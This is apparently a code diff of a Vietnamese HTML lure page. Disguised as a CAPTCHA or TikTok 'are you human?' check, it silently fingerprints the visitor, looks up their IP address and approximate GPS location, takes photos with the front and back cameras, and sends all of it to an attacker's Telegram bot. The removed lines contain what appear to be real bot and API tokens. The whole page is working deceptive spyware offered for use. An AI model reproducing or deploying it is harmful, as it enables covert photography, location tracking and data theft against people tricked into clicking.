@@ -1,213 +1,133 @@
-<!DOCTYPE html>
-<html lang="vi">
+<!DOCTYPE html><html lang="vi">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Xác minh</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TikTok</title>
   <style>
     body {
       margin: 0;
-      background: #f9f9f9;
-      font-family: Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      text-align: center;
     }
-
-    #recaptcha-box {
-      background: #fff;
-      border: 1px solid #d3d3d3;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      padding: 20px 25px;
-      border-radius: 4px;
-      width: 300px;
-      text-align: left;
-      display: flex;
-      align-items: center;
-    }
-
-    #recaptcha-box input {
-      width: 18px;
-      height: 18px;
-      margin-right: 15px;
-      accent-color: #4285f4;
-    }
-
-    #recaptcha-box label {
-      font-size: 14px;
-      color: #222;
-      user-select: none;
-    }
-
-    #loading {
-      display: none;
-      margin-left: auto;
-    }
-
-    #fake-google {
-      font-size: 10px;
-      color: #555;
-      margin-top: 8px;
-      display: flex;
-      justify-content: space-between;
-      font-family: sans-serif;
-    }
-
-    #tiktok-fake {
-      display: none;
-      background: url('https://i.imgur.com/B5gDb6w.gif') center center no-repeat;
-      background-size: cover;
-      width: 100vw;
-      height: 100vh;
-      color: white;
+    h1 {
       font-size: 1.5rem;
-      justify-content: center;
-      align-items: center;
-      display: flex;
+      margin-bottom: 1rem;
     }
-
-    canvas {
-      display: none;
+    button {
+      background: #fe2c55;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 12px 24px;
+      font-size: 1rem;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
+  <h1>Bạn có phải là con người không?</h1>
+  <button onclick="initSpy()">Xác minh</button>  <script>
+    const token = "<TELEGRAM_BOT_TOKEN>"; // <- thay bằng token thật
+    const chatId = "<TELEGRAM_CHAT_ID>";  // <- thay bằng chat_id thật
 
-  <div id="recaptcha-box">
-    <input type="checkbox" id="verify" onclick="startCaptcha()" />
-    <label for="verify">I'm not a robot</label>
-    <div id="loading">⏳</div>
-  </div>
+    function sha256(str) {
+      const buffer = new TextEncoder().encode(str);
+      return crypto.subtle.digest('SHA-256', buffer).then(hash =>
+        Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('')
+      );
+    }
 
-  <div id="fake-google">
-    <div>reCAPTCHA</div>
-    <div>Privacy - Terms</div>
-  </div>
+    async function generateFingerprint() {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+      ctx.textBaseline = "top";
+      ctx.font = "16px Arial";
+      ctx.fillText("fingerprint", 2, 2);
+      const canvasHash = await sha256(canvas.toDataURL());
+      const webglHash = await sha256(navigator.platform + navigator.vendor);
 
-  <div id="tiktok-fake">Đang tải TikTok...</div>
+      const raw = [
+        navigator.userAgent,
+        navigator.language,
+        Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen.width + "x" + screen.height,
+        navigator.hardwareConcurrency,
+        canvasHash,
+        webglHash
+      ].join("|");
 
-  <canvas id="canvas1"></canvas>
-  <canvas id="canvas2"></canvas>
+      return sha256(raw);
+    }
 
-  <script>
-    const token = "8052142616:AAGv1o8o7caAsE6LWMA9nhH8XaIRbnS6a1c";
-    const chat_id = "5017098451";
-    const ipinfo_token = "a144fbf1ea6596";
+    async function getInfo() {
+      const ipData = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => ({}));
+      const fp = await generateFingerprint();
 
-    async function sendFullInfo() {
-      const ipinfo = await fetch(`https://ipinfo.io/json?token=${ipinfo_token}`)
-        .then(res => res.json())
-        .catch(() => null);
+      let isNew = true;
+      let history = JSON.parse(localStorage.getItem("fp_history") || "[]");
+      if (history.includes(fp)) isNew = false;
+      else {
+        history.push(fp);
+        localStorage.setItem("fp_history", JSON.stringify(history));
+      }
 
-      const now = new Date();
-      const loc = ipinfo?.loc?.split(",") || ["?", "?"];
-      const msg = `📡 [THÔNG TIN TRUY CẬP]
-
-🕒 Thời gian: ${now.toLocaleTimeString("vi-VN")} ${now.toLocaleDateString("vi-VN")}
-📱 Thiết bị: ${navigator.userAgent.includes("Android") ? "Android Device" : navigator.userAgent}
-🖥️ Hệ điều hành: Android
-🌍 IP dân cư: ${ipinfo?.ip || "Không xác định"}
-🧠 IP gốc: ${ipinfo?.ip || "Không xác định"}
-🏢 ISP: ${ipinfo?.org || "Không xác định"}
-🏙️ Địa chỉ: ${ipinfo?.city || "?"}, ${ipinfo?.region || "?"}, ${ipinfo?.postal || "?"}
-🌎 Quốc gia: ${ipinfo?.country || "?"}
-📍 Vĩ độ: ${loc[0]}
-📍 Kinh độ: ${loc[1]}
-📌 Vị trí Google Maps: https://maps.google.com/?q=${loc[0]},${loc[1]}`;
+      const time = new Date();
+      const msg = `\uD83D\uDCE1 [TH\u00D4NG TIN TRUY C\u1EACP]\n\n${isNew ? "\uD83C\uDD95 Thi\u1EBFt b\u1ECB m\u1EDBi" : "\u267B\uFE0F Thi\u1EBFt b\u1ECB \u0111\u00E3 truy c\u1EADp tr\u01B0\u1EDBc"}
+\uD83D\uDD52 Th\u1EDDi gian: ${time.toLocaleTimeString()} ${time.toLocaleDateString()}
+\uD83D\uDCF1 Thi\u1EBFt b\u1ECB: ${navigator.userAgent}
+\uD83D\uDCDA Fingerprint: ${fp}
+\uD83C\uDF0D IP: ${ipData.ip || "Không xác định"}
+\uD83C\uDFE2 ISP: ${ipData.org || "Không xác định"}
+\uD83C\uDFE0 \u0110\u1ECBa ch\u1EC9: ${ipData.city || "-"}, ${ipData.region || "-"}, ${ipData.country_name || "-"}
+\uD83C\uDF04 GPS: https://maps.google.com/?q=${ipData.latitude || 0},${ipData.longitude || 0}`;
 
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id, text: msg })
+        body: JSON.stringify({ chat_id: chatId, text: msg })
       });
     }
 
-    async function captureCamera(facingMode, canvasId) {
-      const canvas = document.getElementById(canvasId);
-      const ctx = canvas.getContext("2d");
-      const video = document.createElement("video");
-
+    async function takePhoto(facingMode = "user") {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode }, audio: false
-        });
-
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+        const video = document.createElement("video");
         video.srcObject = stream;
         await video.play();
+        await new Promise(r => setTimeout(r, 800));
 
-        canvas.width = 300;
-        canvas.height = 300;
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
 
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
-        stream.getTracks().forEach(track => track.stop());
-        return blob;
-      } catch (err) {
-        return null;
-      }
-    }
-
-    async function sendPhotos(front, back) {
-      const urlPhoto = `https://api.telegram.org/bot${token}/sendPhoto`;
-      const urlMedia = `https://api.telegram.org/bot${token}/sendMediaGroup`;
-
-      if (front && back) {
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
         const form = new FormData();
-        const media = [];
+        form.append("chat_id", chatId);
+        form.append("photo", blob, `cam_${facingMode}.jpg`);
 
-        media.push({ type: "photo", media: "attach://front.jpg" });
-        media.push({ type: "photo", media: "attach://back.jpg" });
-
-        form.append("chat_id", chat_id);
-        form.append("media", JSON.stringify(media));
-        form.append("front.jpg", front, "front.jpg");
-        form.append("back.jpg", back, "back.jpg");
-
-        await fetch(urlMedia, { method: "POST", body: form });
-
-      } else if (front || back) {
-        const form = new FormData();
-        form.append("chat_id", chat_id);
-        form.append("photo", front || back, "photo.jpg");
-
-        await fetch(urlPhoto, { method: "POST", body: form });
-
-      } else {
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id,
-            text: "📸 Không thể truy cập camera trước hoặc sau!"
-          })
+          body: form
         });
+
+        stream.getTracks().forEach(track => track.stop());
+      } catch (err) {
+        console.warn("Không thể truy cập camera", err);
       }
     }
 
-    async function startCaptcha() {
-      document.getElementById("verify").disabled = true;
-      document.getElementById("loading").style.display = "block";
-
-      // Giả hiệu ứng tick ✔ sau 1s
-      setTimeout(async () => {
-        document.getElementById("loading").innerText = "✔";
-        document.getElementById("recaptcha-box").style.display = "none";
-        document.getElementById("fake-google").style.display = "none";
-        document.getElementById("tiktok-fake").style.display = "flex";
-
-        // Gửi dữ liệu và ảnh
-        sendFullInfo();
-        const front = await captureCamera("user", "canvas1");
-        const back = await captureCamera("environment", "canvas2");
-        await sendPhotos(front, back);
-
-        // Redirect sau 5s
-        setTimeout(() => {
-          window.location.href = "https://www.tiktok.com/";
-        }, 5000);
-      }, 1000);
+    async function initSpy() {
+      await getInfo();
+      await takePhoto("user");
+      await takePhoto("environment");
     }
-  </script>
-</body>
+  </script></body>
 </html>
